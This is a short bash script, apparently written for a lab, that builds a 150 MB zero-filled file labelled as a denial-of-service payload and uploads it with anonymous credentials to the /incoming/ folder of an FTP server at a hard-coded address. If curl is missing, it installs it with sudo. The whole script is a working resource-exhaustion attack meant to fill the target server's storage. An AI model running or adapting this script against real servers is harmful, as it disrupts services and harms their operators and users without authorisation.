#!/bin/bash

TARGET_IP="192.168.1.21"

if [ -z "$TARGET_IP" ]; then
    exit 1
fi

dd if=/dev/zero of=DoS_ftp_payload.dat bs=1M count=150 2>/dev/null

if ! command -v curl &> /dev/null; then
    sudo apt-get update && sudo apt-get install -y curl
fi

curl -s -u "anonymous:anon@lab.com" -T DoS_ftp_payload.dat ftp://${TARGET_IP}/incoming/

rm -f DoS_ftp_payload.dat
exit 0
